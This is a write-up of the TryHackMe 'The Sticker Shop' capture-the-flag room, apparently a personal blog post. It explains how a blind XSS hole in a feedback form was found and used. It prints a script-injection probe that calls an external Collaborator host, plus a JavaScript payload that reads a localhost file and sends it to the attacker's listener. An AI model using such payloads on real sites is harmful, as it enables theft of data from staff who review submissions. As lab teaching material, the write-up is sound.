---
title: "The Sticker Shop"
date: 2024-11-30T03:00:00+06:00
draft: false
tags: ["hacking", "infosec", "tryhackme", "labs"]
categories: ["Write-ups"]
---

How I Solved The Sticker Shop CTF: Exploiting Blind XSS to Capture the Flag. This writeup walks you through the steps of exploiting a Blind XSS vulnerability in a real-world CTF challenge and extracting sensitive data.  

### Room Title
**The Sticker Shop**

### Description
Your local sticker shop has finally developed its own webpage. However, the developers lack web development experience. As a result, they decided to develop and host the webpage on the same computer they use for browsing the internet and checking customer feedback. Smart move!  

The goal of this challenge is to exploit the website and read the flag located at:  
`http://10.10.69.107:8080/flag.txt`  

> Note: 10.10.69.107 is my target machine IP.  

---

## Reconnaissance
Website Overview  
The website consists of two pages:  

### Home Page

- Displays a simple interface with cat stickers and some styling.  
- No apparent vulnerabilities were found here.  

### Submit Feedback Page

- Contains a feedback form with a textarea for users to submit their comments.  
- The form sends a POST request to /submit_feedback.  

### Initial Observations

- The feedback form allows user-supplied input, which could be a potential injection point for attacks like Cross-Site Scripting (XSS).  
- The response to a normal feedback submission is: `Thanks for your feedback! It will be evaluated shortly by our staff`.
![Feedback Response](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*azUPdeyHKnw9ZXVhBEMlJw.png)  

This suggests the feedback is reviewed manually, likely in a staff browser or a vulnerable environment.

---

## Blind XSS Discovery
### Testing for Blind XSS
1. I used **Burp Collaborator** to check if a Blind XSS vulnerability existed.  
2. Payload used: `'"><script src=https://sa6xlni3han13p5f0zgt35x5twznndb2.oastify.com></script>`  

> Note: Here I used my own BurpSuite Collaborator URL.  

![Payload on Feedback form](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pt4unwl6ecCPT4ryPp0VOw.png)  
![Burpsuite collaborator response](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0NOlJtrq_rLMOGRq9b3YNA.png)  

3. After submitting the payload in the feedback form, I observed a DNS interaction logged in Burp Collaborator, confirming the execution of the payload.  

### Vulnerability Context
- Since the feedback is processed and evaluated by staff, any malicious JavaScript submitted through the form will execute when the feedback is reviewed.  
- This confirmed the presence of a Blind XSS vulnerability.

---

## Exploitation
### Setting Up the Listener
I needed a way to exfiltrate data from the server, so I set up a Python HTTP server to act as my listener:  
`python3 -m http.server 8000`  
![Python3 http server](https://miro.medium.com/v2/resize:fit:640/format:webp/1*iOBjYEGRJe2GuEaSdf-qyw.png)


### Crafting the Exploit Payload
To exploit the vulnerability, I crafted a JavaScript payload that:  

- Fetches the flag from the server’s localhost (127.0.0.1:8080/flag.txt).  

I used the localhost address because they said that they host everything on the same computer that they use for browsing the internet and looking at customer feedback.   
![Hint in the challenge description](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZU1zWoy2x1hVy_abAE7Jbw.png)


- Sends the retrieved content to my HTTP server.  
Payload:  
```
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```
> Note: Edit and Replace your own IP Address.  
![Payload in the feedback submission form](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Bn_YgVJOQfWbmOQlUr6I1g.png)

### Injecting the Payload
I submitted the payload in the feedback form.  
Shortly after, my HTTP server captured the exfiltrated flag in the query string of an incoming GET request.  
Example captured request:
![Exaple captured request](https://miro.medium.com/v2/resize:fit:828/format:webp/1*6fahVHTBl2qdC-a-k0xjBA.png)

---

## Lessons Learned
### Blind XSS:

This challenge demonstrates how Blind XSS can be leveraged to execute arbitrary JavaScript on a vulnerable system.  

### Feedback Form Vulnerability:

The lack of input sanitization in the feedback form made this attack possible. It highlights the importance of validating and escaping user input.  

### Exfiltration Techniques:

The exploitation involved fetching sensitive data from localhost (via fetch) and sending it to an external server (via another fetch request).  

### Secure Development Practices:

Always sanitize user inputs, especially in contexts where they might be rendered and executed by another user or system.  

## Conclusion

The Sticker Shop challenge was an engaging task that tested my ability to identify and exploit a Blind XSS vulnerability effectively. By understanding the context in which the staff processed the feedback, I was able to craft and execute a payload to capture the flag successfully.  

---

That’s all for the TryHackMe’s The Sticker Shop room write-up.  
I published it previously on my Medium Blog: [View the post](https://0xshakhawat.medium.com/the-sticker-shop-tryhackme-walkthrough-fad7ff10cbc7)

---